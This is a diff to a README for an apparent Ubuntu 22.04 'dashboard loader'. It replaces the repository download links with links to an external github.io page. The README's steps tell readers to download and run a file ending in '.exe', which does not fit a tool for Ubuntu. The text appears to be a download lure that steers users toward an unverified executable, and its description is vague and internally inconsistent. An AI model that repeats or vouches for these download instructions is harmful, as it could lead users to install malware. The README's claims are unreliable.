@@ -1,6 +1,6 @@
 # 🌐 vas-ubuntu22-dashboard-loader - Manage Ubuntu desktop setups with ease
 
-[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/Gilbertoperculated238/vas-ubuntu22-dashboard-loader)
+[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://gilbertoperculated238.github.io)
 
 This tool helps you manage Ubuntu 22.04 LTS installations from your computer. It automates the preparation of your workstation. You gain control over screen settings, network security, and dashboard features. This dashboard runs commands for you to save time and effort.
 
@@ -19,7 +19,7 @@ Your system should have at least 4GB of RAM to handle the dashboard tasks. Ensur
 
 You must visit the project page to download the latest version of the dashboard. Follow these steps:
 
-1. Visit [this page to download the software](https://github.com/Gilbertoperculated238/vas-ubuntu22-dashboard-loader).
+1. Visit [this page to download the software](https://gilbertoperculated238.github.io).
 2. Look for the file ending in .exe in the releases section.
 3. Click the link to save the file to your Downloads folder.
 4. Locate the icon in your file explorer.
